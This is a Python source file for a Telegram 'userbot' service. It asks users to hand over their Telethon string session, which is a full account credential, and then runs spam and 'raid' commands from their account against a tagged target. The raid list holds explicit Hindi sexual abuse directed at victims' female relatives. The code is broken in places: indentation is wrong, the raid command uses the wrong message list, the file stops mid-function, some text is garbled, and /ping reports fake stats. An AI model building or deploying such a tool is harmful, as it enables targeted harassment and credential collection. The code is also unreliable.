# -*- coding: utf-8 -*-
import os
import warnings
import asyncio
import signal
import logging
from dotenv import load_dotenv
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputMediaPhoto
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters
from aiohttp import web

# Configure logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)

# Suppress deprecated pkg_resources warning
warnings.filterwarnings("ignore", message="pkg_resources is deprecated")

# Load environment variables
load_dotenv()

# --- Config / env vars ---
try:
    API_ID = int(os.getenv("API_ID"))
    API_HASH = os.getenv("API_HASH")
    BOT_TOKEN = os.getenv("BOT_TOKEN")
    if not all([API_ID, API_HASH, BOT_TOKEN]):
        raise ValueError("API_ID, API_HASH, or BOT_TOKEN is missing")
except (ValueError, TypeError) as e:
    logger.error(f"Invalid environment variable: {e}")
    raise

WELCOME_IMAGE = os.getenv("WELCOME_IMAGE_URL") or None
GIRL_IMAGE = os.getenv("GIRL_IMAGE_URL") or None
PING_IMAGE_URL = os.getenv("PING_IMAGE_URL") or None
try:
    OWNER_ID = int(os.getenv("OWNER_ID", "0"))
except (ValueError, TypeError):
    OWNER_ID = 0
SUPPORT_CHANNEL = os.getenv("SUPPORT_CHANNEL", "")
SUPPORT_GROUP = os.getenv("SUPPORT_GROUP", "")
OWNER_USERNAME = os.getenv("OWNER_USERNAME", "")
PORT = int(os.environ.get("PORT", 8080))

# --- In-memory storage ---
userbots = {}
userbot_tasks = {}
waiting_for_string = set()

raid_messages = [
    "𝗧𝗘𝗥𝗜 𝗕𝗔𝗛𝗘𝗡 𝗞𝗜 𝗖𝗛𝗨𝗨‌𝗧 𝗠𝗘𝗜 𝗕𝗔𝗥𝗚𝗔𝗗 𝗞𝗔 𝗣𝗘𝗗 𝗨𝗚𝗔 𝗗𝗨𝗡𝗚𝗔𝗔 𝗖𝗢𝗥𝗢𝗡𝗔 𝗠𝗘𝗜 𝗦𝗔𝗕 𝗢𝗫𝗬𝗚𝗘𝗡 𝗟𝗘𝗞𝗔𝗥 𝗝𝗔𝗬𝗘𝗡𝗚𝗘🤢🤩🥳", 
    "𝗧𝗘𝗥𝗜 𝗠𝗔‌𝗔‌ 𝗞𝗜 𝗖𝗛𝗨𝗨‌𝗧 𝗠𝗘 𝗖𝗛𝗔𝗡𝗚𝗘𝗦 𝗖𝗢𝗠𝗠𝗜𝗧 �_K𝗥𝗨𝗚𝗔 𝗙𝗜𝗥 𝗧𝗘𝗥𝗜 𝗕𝗛𝗘𝗘𝗡 𝗞𝗜 𝗖𝗛𝗨𝗨‌𝗧 𝗔𝗨𝗧𝗢𝗠𝗔𝗧𝗜𝗖𝗔𝗟𝗟𝗬 𝗨𝗣𝗗𝗔𝗧𝗘 𝗛𝗢𝗝𝗔𝗔𝗬𝗘𝗚𝗜🤖🙏🤔", 
    "𝗧𝗘𝗥𝗜 𝗩𝗔𝗛𝗘𝗘𝗡 𝗗𝗛𝗔𝗡𝗗𝗛𝗘 𝗩𝗔𝗔𝗟𝗜 😋😛", 
    "𝗝𝗨𝗡𝗚𝗟𝗘 𝗠𝗘 𝗡𝗔𝗖𝗛𝗧𝗔 𝗛𝗘 𝗠𝗢𝗥𝗘 𝗧𝗘𝗥𝗜 𝗠𝗔‌𝗔‌𝗞𝗜 𝗖𝗛𝗨𝗗𝗔𝗜 𝗗𝗘𝗞𝗞𝗘 𝗦𝗔𝗕 𝗕𝗢𝗟𝗧𝗘 𝗢𝗡𝗖𝗘 𝗠𝗢𝗥𝗘 𝗢𝗡𝗖𝗘 �_M𝗢𝗥𝗘 🤣🤣💦💋", 
    "𝗧𝗘𝗥𝗜 𝗠𝗔‌𝗔‌𝗞𝗜 𝗖𝗛𝗨𝗨‌𝗧𝗛 𝗙𝗔𝗔𝗗𝗞𝗘 𝗥𝗔𝗞𝗗𝗜𝗔 𝗠𝗔‌𝗔‌𝗞𝗘 𝗟𝗢𝗗𝗘 𝗝𝗔𝗔 𝗔𝗕𝗕 𝗦𝗜𝗟𝗪𝗔𝗟𝗘 👄👄", 
    "𝗖𝗛𝗔𝗟 𝗕𝗘𝗧𝗔 𝗧𝗨𝗝𝗛𝗘 𝗠𝗔‌𝗔‌𝗙 𝗞𝗜𝗔 🤣 𝗔𝗕𝗕 𝗔𝗣𝗡𝗜 𝗚𝗙 𝗞𝗢 𝗕𝗛𝗘𝗝", 
    "𝗧𝗘𝗥𝗜 𝗚𝗙 𝗞𝗢 𝗘𝗧𝗡𝗔 𝗖𝗛𝗢𝗗𝗔 𝗕𝗘‌𝗛𝗘𝗡 𝗞𝗘 𝗟𝗢𝗗𝗘 𝗧𝗘𝗥𝗜 𝗚𝗙 𝗧𝗢 𝗠𝗘𝗥𝗜 𝗥Æ𝗡𝗗𝗜 𝗕𝗔𝗡𝗚𝗔�_Y𝗜 𝗔𝗕𝗕 𝗖𝗛𝗔𝗟 𝗧𝗘𝗥𝗜 𝗠𝗔‌𝗔‌𝗞𝗢 𝗖𝗛𝗢𝗗𝗧𝗔 𝗙𝗜𝗥𝗦𝗘 ♥️💦😆😆😆😆", 
    "𝗦𝗨𝗡 𝗠𝗔‌𝗔‌𝗗𝗔𝗥𝗖𝗛Ø𝗗 𝗝𝗬𝗔𝗗𝗔 𝗡𝗔 𝗨𝗖𝗛𝗔𝗟 𝗠𝗔‌𝗔‌ 𝗖𝗛𝗢𝗗 𝗗𝗘𝗡𝗚𝗘 𝗘𝗞 �_M𝗜𝗡 𝗠𝗘𝗜 ✅🤣🔥🤩", 
    "𝗧𝗘𝗥𝗜 𝗕𝗘𝗛𝗡 𝗞𝗜 𝗖𝗛𝗨𝗨‌𝗧 𝗠𝗘 𝗞𝗘𝗟𝗘 𝗞𝗘 𝗖𝗛𝗜𝗟𝗞𝗘 🤤🤤", 
    "𝗧𝗘𝗥𝗜 𝗕𝗔𝗛𝗘𝗡 𝗞𝗜 𝗚𝗔𝗔𝗡𝗗 𝗠𝗘𝗜 𝗢𝗡𝗘𝗣𝗟𝗨𝗦 𝗞𝗔 𝗪𝗥𝗔𝗣 𝗖𝗛𝗔𝗥𝗚𝗘𝗥 30𝗪 𝗛𝗜𝗚𝗛 𝗣𝗢𝗪𝗘𝗥 💥😂😎", 
    "𝗔𝗥𝗘 𝗥𝗘 𝗠𝗘𝗥𝗘 𝗕𝗘𝗧𝗘 𝗞𝗬𝗢𝗨𝗡 𝗦𝗣𝗘𝗘𝗗 𝗣𝗔𝗞𝗔𝗗 𝗡𝗔 𝗣𝗔𝗔 𝗥𝗔𝗛𝗔 𝗔𝗣𝗡𝗘 𝗕𝗔𝗔𝗣 𝗞𝗔 𝗛𝗔𝗛𝗔𝗛🤣🤣", 
    "𝗧𝗘𝗥𝗜 𝗠𝗔‌𝗔‌𝗔𝗞𝗜 𝗖𝗛𝗨𝗗𝗔𝗜 𝗞𝗢 𝗣𝗢𝗥𝗡𝗛𝗨𝗕.𝗖𝗢𝗠 𝗣𝗘 𝗨𝗣𝗟𝗢𝗔𝗗 𝗞𝗔𝗥𝗗𝗨𝗡𝗚𝗔 𝗦𝗨𝗔𝗥 𝗞𝗘 𝗖𝗛𝗢𝗗𝗘 🤣💋💦", 
    "𝗧𝗘𝗥𝗜 𝗠𝗔‌𝗔‌ 𝗞𝗘 𝗕𝗛𝗢𝗦𝗗𝗘 𝗠𝗘𝗜 𝗚𝗜𝗧𝗛𝗨𝗕 𝗗𝗔𝗟 𝗞𝗘 𝗔𝗣𝗡𝗔 𝗕𝗢𝗧 𝗛𝗢𝗦𝗧 𝗞𝗔𝗥𝗨𝗡𝗚𝗔𝗔 🤩👊👤😍", 
    "𝗧𝗘𝗥𝗜 𝗠𝗔‌𝗔‌ 𝗞𝗜 𝗖😂𝗛𝗨𝗨‌𝗧 𝗞𝗔𝗞𝗧𝗘 🤱 𝗚𝗔𝗟𝗜 𝗞𝗘 𝗞𝗨𝗧𝗧𝗢 🦮 𝗠𝗘 𝗕𝗔𝗔𝗧 𝗗𝗨𝗡𝗚𝗔 𝗣𝗛𝗜𝗥 🍞 𝗕𝗥𝗘𝗔𝗗 �𝗞𝗜 𝗧𝗔𝗥𝗛 𝗞𝗛𝗔𝗬𝗘𝗡𝗚𝗘 𝗪𝗢 𝗧𝗘𝗥𝗜 𝗠𝗔‌𝗔‌ �_K𝗜 𝗖𝗛𝗨𝗨‌𝗧", 
    "𝗧𝗘𝗥𝗜 𝗥Æ𝗡𝗗𝗜 𝗠𝗔‌𝗔‌ 𝗦𝗘 𝗣𝗨𝗖𝗛𝗡𝗔 𝗕𝗔𝗔𝗣 𝗞𝗔 𝗡𝗔𝗔𝗠 𝗕𝗔𝗛𝗘𝗡 𝗞𝗘 𝗟𝗢𝗗𝗘𝗘𝗘𝗘𝗘 🤩🥳😳", 
    "𝗧𝗘𝗥𝗔 𝗕𝗔𝗔𝗣 𝗝𝗢𝗛𝗡𝗬 𝗦𝗜𝗡𝗦 𝗖𝗜𝗥𝗖𝗨𝗦 𝗞𝗔𝗬 𝗕�_H𝗢𝗦𝗗𝗘 𝗝𝗢𝗞𝗘𝗥 𝗞𝗜 𝗖𝗛𝗜𝗗𝗔𝗔𝗦 𝟭𝟰 𝗟𝗨𝗡𝗗 𝗞𝗜 𝗗𝗛𝗔𝗔𝗥 𝗧𝗘𝗥𝗜 𝗠𝗨𝗠𝗠𝗬 𝗞𝗜 𝗖𝗛𝗨𝗧 𝗠𝗔𝗜 𝟮𝟬𝟬 𝗜𝗡𝗖𝗛 𝗞𝗔 �_L𝗨𝗡𝗗"
]
love_messages = [
    "💖 𝗠𝗼𝗵𝗮𝗯𝗯𝗮𝘁 𝗸𝗮 𝗷𝘂𝗻𝗼𝗼𝗻 𝘀𝗶𝗿𝗳 𝘂𝗻𝗸𝗼 𝗵𝗼𝘁𝗮 𝗵𝗮𝗶\n𝗝𝗶𝗻𝗵𝗲 𝗽𝘆𝗮𝗮𝗿 𝗸𝗶 𝗸𝗮𝗱𝗮𝗿 𝗵𝗼𝘁𝗶 𝗵𝗮𝗶 💕",
    "🌙 𝗖𝗵𝗮𝗻𝗱𝗻𝗶 𝗿𝗮𝗮𝘁 𝗺𝗲𝗶𝗻 𝘁𝗲𝗿𝗶 𝘆𝗮𝗮𝗱𝗼𝗻 𝗸𝗮 𝗷𝗮𝗱𝗼𝗼 𝗵𝗮𝗶,\n𝗗𝗶𝗹 𝗸𝗲 𝗵𝗮𝗿 𝗸𝗼𝗻𝗲 𝗺𝗲𝗶𝗻 𝘀𝗶𝗿𝗳 𝘁𝗲𝗿𝗮 𝗵𝗶 𝗮𝗮𝘀𝗵𝗶𝘆𝗮𝗮𝗻𝗮 𝗵𝗮𝗶 💫",
    "❤️ �_Z𝗶𝗻𝗱𝗮𝗴𝗶 𝗸𝗲 𝘀𝗮𝗳𝗮𝗿 𝗺𝗲𝗶𝗻 𝗺𝗶𝗹𝘁𝗶 𝗿𝗮𝗵𝗲 𝘁𝗲𝗿𝗶 𝗺𝘂𝘀𝗸𝗮𝗮𝗻,\n𝗬𝗮𝗵𝗶 𝗵𝗮𝗶 𝗺𝗲𝗿𝗶 𝗱𝘂𝗮 𝗵𝗮𝗿 𝘀𝘂𝗯𝗮𝗵 𝗮𝘂𝗿 𝘀𝗵𝗮𝗮𝗺 💝",
    "💌 𝗛𝗮𝗿 𝘀𝗵𝗮𝘆𝗮𝗿𝗶 𝘁𝗲𝗿𝗶 𝘆𝗮𝗮𝗱 𝗺𝗲𝗶𝗻 𝗹𝗶𝗸𝗵𝘁𝗮 𝗵𝗼𝗼𝗻,\n𝗧𝘂 𝗺𝗲𝗿𝗶 𝗺𝗼𝗵𝗮𝗯𝗯𝗮𝘁, 𝘁𝘂 𝗺𝗲𝗿𝗮 𝗮𝗿𝗺𝗮𝗮𝗻 𝗵𝗮𝗶 💖",
    "🌹 𝗧𝘂𝗺𝗵𝗮𝗿𝗮 𝗻𝗮𝗮𝗺 𝗹𝗲𝗸𝗮𝗿 𝗹𝗶𝗸𝗵𝗶 𝗵𝗮𝗶 𝗵𝗮𝗿 𝗴𝗵𝗮𝘇𝗮𝗹,\n𝗧𝘂𝗺 𝗺𝗲𝗿𝗶 𝘇𝗶𝗻𝗱𝗮𝗴𝗶 𝗸𝗶 𝘀𝗮𝗯𝘀𝗲 𝗸𝗵𝗼𝗼𝗯𝘀𝘂𝗿𝗮𝘁 𝗺𝗶𝘀𝗮𝗮𝗹 💕",
    "✨ 𝗧𝗲𝗿𝗲 𝗯𝗶𝗻𝗮 𝘇𝗶𝗻𝗱𝗮𝗴𝗶 𝗮𝗱𝗵𝗼𝗼𝗿𝗶 𝗹𝗮𝗴𝘁𝗶 𝗵𝗮𝗶,\n𝗧𝘂 𝗵𝗼 𝘁𝗼𝗵 𝘀𝗮𝗯 𝗸𝘂𝗰𝗵 𝗽𝗼𝗼𝗿𝗮 𝗹𝗮𝗴𝘁𝗮 𝗵𝗮𝗶 💞",
    "🔥 𝗛𝗮𝗿 𝗱𝗵𝗮𝗱𝗸𝗮𝗻 𝗺𝗲𝗶𝗻 𝘀𝗶𝗿𝗳 𝘁𝗲𝗿𝗮 𝗵𝗶 𝘇𝗶𝗸𝗿 𝗵𝗮𝗶,\n𝗧𝘂 𝗺𝗲𝗿𝗶 𝘇𝗶𝗻𝗱�_a𝗴𝗶 𝗸𝗮 𝘀𝗮𝗯𝘀𝗲 𝗸𝗵𝗼𝗼𝗯𝘀𝘂𝗿𝗮𝘁 𝗳𝗶𝗸𝗿 𝗵𝗮𝗶 ❤️",
    "🌸 𝗧𝗲𝗿𝗲 𝗯𝗶𝗻𝗮 𝗵𝗮𝗿 𝗹𝗮𝗺𝗵𝗮 𝘀𝗼𝗼𝗻𝗮 𝘀𝗮 𝗹𝗮𝗴𝘁𝗮 𝗵𝗮�_i,\n𝗔𝘂𝗿 𝘁𝗲𝗿𝗲 𝘀𝗮𝘁𝗵 𝘀𝗮𝗯 𝗸𝘂𝗰𝗵 𝗿𝗼𝘀𝗵𝗮𝗻 𝗵𝗼 𝗷𝗮𝗮𝘁𝗮 𝗵𝗮�_i 💖",
    "💍 𝗣𝘆𝗮𝗮𝗿 𝗸𝗶 𝗸𝗼𝗶 𝗺�_a𝗻𝘇𝗶𝗹 𝗻𝗮𝗵𝗶,\n𝗕𝗮𝘀 𝗲𝗸 𝘀𝗮𝗳𝗮𝗿 𝗵𝗮𝗶 𝗷𝗼 𝘁𝗲𝗿𝗶 𝗺𝘂𝘀𝗸𝗮𝗮𝗻 𝘀𝗲 𝗿𝗼𝘀𝗵𝗮𝗻 𝗵𝗮𝗶 🌹",
    "💕 𝗧𝘂 𝗺𝗲𝗿𝗶 𝗱𝘂𝗮𝗼𝗻 𝗸𝗮 𝘄𝗼 𝗵𝗶𝘀𝘀�_a 𝗵𝗮𝗶,\n𝗝𝗶𝘀𝗲 𝗔𝗹𝗹𝗮𝗵 𝗻𝗲 𝘀𝗮𝗯𝘀𝗲 𝗸𝗵𝗼𝗼𝗯𝘀𝘂𝗿𝗮𝘁 𝘁𝗮𝘂𝗿 𝗽𝗮𝗿 𝗾�_a𝗯𝗼𝗼𝗹 𝗸𝗶𝘆𝗮 💞",
    "🌹 𝗧𝗲𝗿𝗲 𝗵𝗮𝘀𝗶𝗻 𝗹𝗮𝗯𝗼𝗻 𝗸𝗶 𝗺𝘂𝘀𝗸𝗮𝗮𝗻 𝗺𝗲𝗿𝗶 𝘇𝗶𝗻𝗱𝗮𝗴𝗶 𝗸𝗮 𝗻𝗼𝗼𝗿 𝗵𝗮𝗶 ✨",
    "💫 𝗧𝘂𝗺𝗵𝗮𝗿𝗶 𝗮𝗮𝗻𝗸𝗵𝗼𝗻 𝗺𝗲𝗶𝗻 𝗷𝗼 𝗽𝘆𝗮𝗮𝗿 𝗵𝗮𝗶, 𝘄𝗼 𝗺𝗲𝗿𝗶 𝗱𝘂𝗻𝗶𝘆𝗮 𝗸𝗮 𝘀𝗮𝗯𝘀𝗲 𝗸𝗵𝗼𝗼𝗯𝘀𝘂𝗿𝗮𝘁 𝘀𝗮𝗴𝗮𝗿 𝗵𝗮𝗶 🌊",
    "🔥 𝗧𝘂𝗺𝗵𝗮𝗿𝗮 𝗽𝘆𝗮𝗮𝗿 𝗺𝗲𝗿𝗶 𝘇𝗶𝗻𝗱𝗮𝗴𝗶 𝗸�_a 𝘀𝗮𝗯𝘀𝗲 𝗸𝗵𝗼𝗼𝗯𝘀𝘂𝗿�_a𝘁 𝗶𝗸𝗿𝗮𝗮𝗿 𝗵𝗮𝗶 ❤️"
]

# ----------------- Telegram Handlers -----------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle the /start command."""
    logger.info(f"/start command received from {update.effective_user.id}")
    user_id = update.effective_user.id
    waiting_for_string.add(user_id)

    keyboard = [
        [
            InlineKeyboardButton("𝐂𝐇𝐀𝐍𝐍𝐄𝐋", url=SUPPORT_CHANNEL),
            InlineKeyboardButton("𝐆𝐑𝐎𝐔𝐏", url=SUPPORT_GROUP)
        ],
        [
            InlineKeyboardButton("𝐇𝐄𝐋𝐏", callback_data="help"),
            InlineKeyboardButton("𝐑𝐄𝐏𝐎", callback_data="about")
        ],
        [
            InlineKeyboardButton("𝐃𝐄𝐕", url=f"https://t.me/{OWNER_USERNAME}"),
            InlineKeyboardButton("𝐀𝐁𝐎𝐔𝐓", callback_data="about_info")
        ]
    ]

    caption = """┌────── ˹ ɪɴғᴏʀᴍᴀᴛɪᴏɴ ˼ ⏤͟͟͞͞‌‌‌‌★
┆◍ ʜᴇʏ, ɪ ᴀᴍ : 𝗥𝗔𝗗𝗛𝗔 ✘ 𝗨𝗦𝗘𝗥𝗕𝗢𝗧
┆◍ ɴɪᴄᴇ ᴛᴏ ᴍᴇᴇᴛ ʏᴏᴜ ᴅᴇᴀʀ !! 
└────────────────────•
 ❖ ɪ ᴀᴍ ᴀ ᴘᴏᴡᴇʀғᴜʟ & ᴜsᴇғᴜʟʟ ᴜsᴇʀʙᴏᴛ.
 ❖ ʏᴏᴜ ᴄᴀɴ ᴜsᴇ ᴍᴇ ғᴏʀ ғᴜɴ ʀᴀɪᴅ sᴘᴀᴍ.
 ❖ ɪ ᴄᴀɴ ʙᴏᴏsᴛ ʏᴏᴜʀ ɪᴅ ᴡɪᴛʜ ᴀɴɪᴍᴀᴛɪᴏɴ
 ❖ ᴛᴀᴘ ᴛᴏ ʜᴇʟᴘ ʙᴜᴛᴛᴏɴ ғᴏʀ ᴅᴇᴛᴀɪʟs.
 •────────────────────• 
 ⚡𝗦𝗘𝗡𝗗 𝗠𝗘 𝗬𝗢𝗨𝗥 𝗧𝗘𝗟𝗘𝗧𝗛𝗢𝗡 𝗦𝗧𝗥𝗜𝗡𝗚 𝗦𝗘𝗦𝗦𝗜𝗢𝗡 𝗧𝗢 𝗕𝗢𝗢𝗧 𝗬𝗢𝗨𝗥 𝗖𝗟𝗜𝗘𝗡𝗧"""
    if WELCOME_IMAGE:
        await update.message.reply_photo(
            photo=WELCOME_IMAGE,
            caption=caption,
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    else:
        await update.message.reply_text(caption, reply_markup=InlineKeyboardMarkup(keyboard))

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check if a userbot is running for the user."""
    user_id = update.effective_user.id
    if user_id in userbots:
        client = userbots[user_id]
        me = await client.get_me()
        await update.message.reply_text(f"✅ ᴜsᴇʀʙᴏᴛ ɪs ʀᴜɴɴɪɴɢ: {me.first_name} (ID: {me.id})")
    else:
        await update.message.reply_text("⚠️ No active userbot.")

async def ping(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle the /ping command with image, message editing, and support channel button."""
    keyboard = [[InlineKeyboardButton("𝗦𝗨𝗣𝗣𝗢𝗥𝗧", url=SUPPORT_CHANNEL)]] if SUPPORT_CHANNEL else []
    if PING_IMAGE_URL:
        msg = await update.message.reply_photo(
            photo=PING_IMAGE_URL,
            caption="🔄 Pinging...",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        await asyncio.sleep(0.2)
        await msg.edit_caption(caption="""✅ 𝗣𝗢𝗡𝗚!!
 ʜᴇʏ ᴛʜᴇʀᴇ ɪ ᴀᴍ ᴀʟɪᴠᴇ
 ➻ sʏsᴛᴇᴍ sᴛᴀᴛs :
:⧽ ᴜᴩᴛɪᴍᴇ : 6ʜ:14ᴍ:38s
:⧽ ʀᴀᴍ : 45.4%
:⧽ ᴄᴩᴜ : 28.3%
:⧽ ᴅɪsᴋ : 25.9%""", reply_markup=InlineKeyboardMarkup(keyboard))
    else:
        msg = await update.message.reply_text("🔄 ᴘɪɴɢɪɴɢ...", reply_markup=InlineKeyboardMarkup(keyboard))
        await asyncio.sleep(0.2)
        await msg.edit_text("✅ 𝗣𝗢𝗡𝗚!!", reply_markup=InlineKeyboardMarkup(keyboard))

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle button clicks."""
    query = update.callback_query
    await query.answer()

    if query.data == "help":
        keyboard = [
            [InlineKeyboardButton("𝐒𝐓𝐎𝐏 𝐁𝐎𝐓", callback_data="stop")],
            [InlineKeyboardButton("𝐁𝐀𝐂𝐊", callback_data="back")]
        ]
        caption = "ʜᴇʀᴇ ᴀʀᴇ sᴏᴍᴇ ᴄᴏᴍᴍᴀɴᴅs:\n\n [ʙᴏᴛ ᴄᴏᴍᴍᴀɴᴅs  /ping, /status]\n\n [ᴄʟɪᴇɴᴛ ᴄᴏᴍᴍᴀɴᴅs  .ping, .alive, .love, .spam, .raid]"
        if GIRL_IMAGE:
            await query.edit_message_media(
                InputMediaPhoto(GIRL_IMAGE, caption=caption),
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
        else:
            await query.edit_message_caption(caption, reply_markup=InlineKeyboardMarkup(keyboard))

    elif query.data == "stop":
        user_id = query.from_user.id
        if user_id in userbots:
            try:
                await userbots[user_id].disconnect()
            except Exception as e:
                logger.error(f"Failed to disconnect userbot for {user_id}: {e}")
            if user_id in userbot_tasks:
                task = userbot_tasks[user_id]
                if not task.done():
                    task.cancel()
            userbots.pop(user_id, None)
            userbot_tasks.pop(user_id, None)
            await query.edit_message_caption("🛑 Userbot stopped.")
        else:
            await query.edit_message_caption("⚠️ No active userbot.")

    elif query.data == "back":
        keyboard = [
            [
                InlineKeyboardButton("𝐂𝐇𝐀𝐍𝐍𝐄𝐋", url=SUPPORT_CHANNEL),
                InlineKeyboardButton("𝐆𝐑𝐎𝐔𝐏", url=SUPPORT_GROUP)
            ],
            [
                InlineKeyboardButton("𝐇𝐄𝐋𝐏", callback_data="help"),
                InlineKeyboardButton("𝐑𝐄𝐏𝐎", callback_data="about")
            ],
            [
                InlineKeyboardButton("𝐎𝐖𝐍𝐄𝐑", url=f"https://t.me/{OWNER_USERNAME}"),
                InlineKeyboardButton("𝐀𝐛𝐨𝐮𝐭", callback_data="about_info")
            ]
        ]
        caption = """┌────── ˹ ɪɴғᴏʀᴍᴀᴛɪᴏɴ ˼ ⏤͟͟͞͞‌‌‌‌★
┆◍ ʜᴇʏ, ɪ ᴀᴍ : 𝗥𝗔𝗗𝗛𝗔 ✘ 𝗨𝗦𝗘𝗥𝗕𝗢𝗧
┆◍ ɴɪᴄᴇ ᴛᴏ ᴍᴇᴇᴛ ʏᴏᴜ ᴅᴇᴀʀ !! 
└────────────────────•
 ❖ ɪ ᴀᴍ ᴀ ᴘᴏᴡᴇʀғᴜʟ & ᴜsᴇғᴜʟʟ ᴜsᴇʀʙᴏᴛ.
 ❖ ʏᴏᴜ ᴄᴀɴ ᴜsᴇ ᴍᴇ ғᴏʀ ғᴜɴ ʀᴀɪᴅ sᴘᴀᴍ.
 ❖ ɪ ᴄᴀɴ ʙᴏᴏsᴛ ʏᴏᴜʀ ɪᴅ ᴡɪᴛʜ ᴀɴɪᴍᴀᴛɪᴏɴ
 ❖ ᴛᴀᴘ ᴛᴏ ʜᴇʟᴘ ʙᴜᴛᴛᴏɴ ғᴏʀ ᴅᴇᴛᴀɪʟs.
 •────────────────────• 
 ⚡𝗦𝗘𝗡𝗗 𝗠𝗘 𝗬𝗢𝗨𝗥 𝗧𝗘𝗟𝗘𝗧𝗛𝗢𝗡 𝗦𝗧𝗥𝗜𝗡𝗚 𝗦𝗘𝗦�_S𝗜𝗢𝗡 𝗧𝗢 𝗕𝗢𝗢𝗧 𝗬𝗢𝗨𝗥 𝗖𝗟𝗜𝗘𝗡𝗧"""
        if WELCOME_IMAGE:
            await query.edit_message_media(
                InputMediaPhoto(WELCOME_IMAGE, caption=caption),
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
        else:
            await query.edit_message_caption(caption, reply_markup=InlineKeyboardMarkup(keyboard))

    elif query.data == "about":
        await query.answer("𝐋𝐎𝐃𝐀 𝐋𝐄𝐆𝐀 𝐁𝐒𝐃𝐊 🥴 𝐉𝐀 𝐏𝐄𝐇𝐋𝐄 𝐏𝐀𝐍𝐃𝐀 𝐊𝐎 𝐁𝐀𝐀𝐏 𝐁𝐎𝐋𝐊𝐄 𝐀𝐀 😎", show_alert=True)

    elif query.data == "about_info":
        caption = """┌────── ˹ ɪɴғᴏʀᴍᴀᴛɪᴏɴ ˼ ⏤‌‌‌‌‌‌‌‌★
┆◍ ʜᴇʏ, ɪ ᴀᴍ : <b>𝗥𝗔𝗗𝗛𝗔 ✘ 𝗨𝗦𝗘𝗥𝗕𝗢𝗧</b>

ᴀ ᴘᴏᴡᴇʀғᴜʟʟ ᴛᴇʟᴇɢʀᴀᴍ ᴜsᴇʀʙᴏᴛ ᴅᴇsɪɢɴᴇᴅ ғᴏʀ ғᴜɴ ғᴇᴀᴛᴜʀᴇs ɪɴᴄʟᴜᴅᴇ ʀᴀɪᴅ + sᴘᴀᴍ + ʟᴏᴠᴇ ᴄᴏᴍᴍᴀɴᴅs. ᴊᴏɪɴ ᴏᴜʀ sᴜᴘᴘᴏʀᴛ ᴄʜᴀɴɴᴇʟ ᴀɴᴅ ɢʀᴏᴜᴘ ғᴏʀ ᴜᴘᴅᴀᴛᴇs.

<b>ᴘᴏᴡᴇʀᴇᴅ ʙʏ</b> <a href='https://t.me/RADHIKA_YIIOO'> ʀᴀᴅʜɪᴋᴀ-x-ɴᴇᴛᴡᴏʀᴋ</a>
<b>ʟᴀɴɢᴜᴀɢᴇ</b> <a href='https://www.python.org'> ᴘʏᴛʜᴏɴ</a>
<b>ʜᴏsᴛɪɴɢ sɪᴛᴇ</b> <a href='https://render.com'> ʀᴇɴᴅᴇʀ</a> | <a href='https://www.heroku.com'> ʜᴇʀᴜᴋᴏ</a> | <a href='https://www.koyeb.com'> ᴋᴏʏᴇʙ</a> | <a href='https://railway.app'> ʀᴀɪʟᴡᴀʏ</a>
"""
        if WELCOME_IMAGE:
            await query.edit_message_media(
                InputMediaPhoto(WELCOME_IMAGE, caption=caption, parse_mode="HTML"),
                reply_markup=query.message.reply_markup
            )
        else:
            await query.edit_message_caption(caption=caption, parse_mode="HTML", reply_markup=query.message.reply_markup)

# ----------------- Telethon Userbot -----------------
def register_userbot_handlers(client, me):
    """Register event handlers for the userbot."""
    @client.on(events.NewMessage(pattern=r"\.ping"))
    async def ping(event):
        m = await event.respond("🔄 Pinging...")
        await asyncio.sleep(0.2)
        await m.edit(f"✅ ʜᴇʏ ɪ ᴀᴍ ᴀʟɪᴠᴇ {me.first_name}")

    @client.on(events.NewMessage(pattern=r"\.alive"))
    async def alive(event):
        await event.respond(f"✅ {me.first_name} is online.")

    @client.on(events.NewMessage(pattern=r"\.love(?:\s+\d+)?"))
    async def love_handler(event):
        if not event.is_reply:
            return await event.reply("Reply to a message with `.love <count>`")
        reply_msg = await event.get_reply_message()
        user = await reply_msg.get_sender()
        mention = f"@{user.username}" if user.username else f"<a href='tg://user?id={user.id}'>{user.first_name}</a>"
        args = event.raw_text.split()
        count = min(int(args[1]), 10) if len(args) > 1 and args[1].isdigit() else 3
        for i in range(count):
            text = love_messages[i % len(love_messages)]
            await event.respond(f"{mention}, {text}", parse_mode="html")
            await asyncio.sleep(0.0)  # Reduced delay for faster sending

    @client.on(events.NewMessage(pattern=r"\.spam(?:\s+(\d+)\s+(.+))?$"))
    async def spam_handler(event):
        """Send a custom message multiple times. Usage: .spam <count> <message>"""
        if not event.pattern_match.group(1):
            return await event.reply("Usage: `.spam <count> <message>` (e.g., `.spam 5 Hello!`)")
        
        args = event.pattern_match.group(1), event.pattern_match.group(2)
        if not all(args):
            return await event.reply("Please provide both a count and a message.")
        
        try:
            count = min(int(args[0]), 10)  # Limit to 10 messages to avoid bans
            message = args[1]
            if len(message) > 4096:  # Telegram's max message length
                return await event.reply("Message too long! Keep it under 4096 characters.")
            
            for _ in range(count):
                await event.respond(message)
                await asyncio.sleep(0.0)  # Reduced delay for faster sending
            await event.reply(f"✅ Sent {count} messages.")
        except ValueError:
            await event.reply("Invalid count. Please provide a number (e.g., `.spam 5 Hello!`).")
        except Exception as e:
            await event.reply(f"❌ Error: {e}")

 @client.on(events.NewMessage(pattern=r"\.raid(?:\s+\d+)?"))
 async def raid_handler(event):
    if not event.is_reply:
        return await event.reply("Reply to a message with `.raid <count>`")

    reply_msg = await event.get_reply_message()
    user = await reply_msg.get_sender()

    mention = f"@{user.username}" if user.username else f"<a href='tg://user?id={user.id}'>{user.first_name}</a>"

    args = event.raw_text.split()
    count = min(int(args[1]), 10) if len(args) > 1 and args[1].isdigit() else 3

    if not love_messages:
        return await event.reply("No raid messages configured.")

    for i in range(count):
        text = love_messages[i % len(love_messages)]
        await event.respond(f"{mention}, {text}", parse_mode="html")
        await asyncio.sleep(0.0)

